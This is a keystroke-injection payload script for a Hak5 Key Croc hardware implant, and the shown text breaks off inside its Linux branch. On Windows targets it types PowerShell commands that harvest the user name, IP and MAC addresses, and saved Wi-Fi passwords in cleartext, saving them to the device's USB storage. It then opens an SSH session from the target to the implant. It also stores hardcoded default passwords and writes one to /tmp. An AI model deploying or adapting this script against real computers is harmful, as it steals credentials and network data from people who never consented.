# Title:         Croc_Pot Payload
# Description:   Start Croc_pot.sh bash script automatically, scan takes about 30-40 sec to start because of OS detection
#                This will collect some data off target PC
#                (ip address, current user name, pc host name, ssid and passwd, mac address)
#                save to tools/Croc_pot folder
# Author:        Spywill
# Version:       1.2
# Category:      Key Croc

MATCH crocpot

#---> Edit KEYCROC_PASSWD_HERE
CROC_PW=hak5croc

#---> Edit LINUX-PC_PASSWD_HERE
PC_PW=LINUX

#---> Save keycroc passwd in temp folder
#---> This is used for starting Reverse SSH Tunnel with Target PC
echo "${CROC_PW}" >> /tmp/CPW.txt

#---> Payload variable/remove existing OS detection
CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
cat > ${CROC_OS}
rm /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt

#---> Enter ethernet mode for OS detection
ATTACKMODE AUTO_ETHERNET
LED ATTACK

#---> Keycroc built in functions to retrieve target PC Loot
GET TARGET_OS
GET TARGET_IP
GET HOST_IP
GET TARGET_HOSTNAME

#---> After OS detection case TARGET_OS value
case $TARGET_OS in
WINDOWS)
	LED R
	#---> Enter Storage mode on keycroc
	ATTACKMODE HID STORAGE
	sleep 1
	#---> Start windows powershell
	Q GUI r
	sleep 1
	Q STRING "powershell"
	Q ENTER
	sleep 5
	#---> Place keycroc usb drive into variable
	Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
	Q ENTER
	sleep 1
	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
	Q STRING "\$env:UserName | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
	Q ENTER
	sleep 1
	#---> Retrieve target PC IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
	Q STRING "Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=\$true | Select-Object -ExpandProperty IPAddress | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
	Q ENTER
	sleep 1
	#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
	Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
	Q ENTER
	sleep 2
	#---> Retrieve target PC MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
	Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
	Q ENTER
	sleep 3
	#---> Retrieve Shark Jack IP if connected to local network as keycroc & save to tools/Croc_Pot/shark_ip.txt
	Q STRING "[System.Net.Dns]::GetHostAddresses(\"shark.lan\")[0].IPAddressToString | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\shark_ip.txt\" -noclobber -append"
	Q ENTER
	sleep 3
	#---> Return back to ATTACKMODE HID mode
	ATTACKMODE HID
	sleep 1
	#---> Start SSH session with target PC
	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
	Q ENTER
	sleep 2
	#---> Entering keycroc passwd
	Q STRING "${CROC_PW}"
	Q ENTER
	sleep 2
	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
	echo "$TARGET_OS" >> ${CROC_OS}
	echo "$TARGET_IP" >> ${CROC_OS}
	echo "$TARGET_HOSTNAME" >> ${CROC_OS}
	echo "$HOST_IP" >> ${CROC_OS}
	#---> Edit with sed to remove powershell output "r" endlines & remove first character
	$(sed -i 's/\r//g' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
	$(sed -i '0,/./s/^.//' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
	#---> Starting Croc_Pot
	Q STRING "/root/udisk/tools/Croc_Pot.sh"
	Q ENTER ;;
MACOS)
	#---> Return back to ATTACKMODE HID mode
	ATTACKMODE HID
	LED G
	sleep 1
	#---> Start mac os terminal
	Q GUI-SPACE
	sleep 1
	Q STRING "terminal"
	Q ENTER
	sleep 2
	#---> Start SSH session with target PC
	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
	Q ENTER
	sleep 2
	#---> Entering keycroc passwd
	Q STRING "${CROC_PW}"
	Q ENTER
	sleep 1
	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
	echo "$TARGET_OS" >> ${CROC_OS}
	echo "$TARGET_IP" >> ${CROC_OS}
	echo "$TARGET_HOSTNAME" >> ${CROC_OS}
	echo "$HOST_IP" >> ${CROC_OS}
	#---> Starting Croc_Pot
	Q STRING "/root/udisk/tools/Croc_Pot.sh"
	Q ENTER ;;
LINUX)
	#---> Enter Storage mode on keycroc
	ATTACKMODE HID STORAGE
	LED B
	sleep 3
	#---> After TARGET_HOSTNAME scan case TARGET_HOSTNAME value
	case $TARGET_HOSTNAME in
raspberrypi)
	#---> Start Raspberry pi 4 terminal -->gnome-terminal installed<--
	Q GUI d
	sleep 1
	Q STRING "terminal"
	Q ENTER
	Q ENTER
	sleep 2
	#---> Place keycroc usb drive into variable
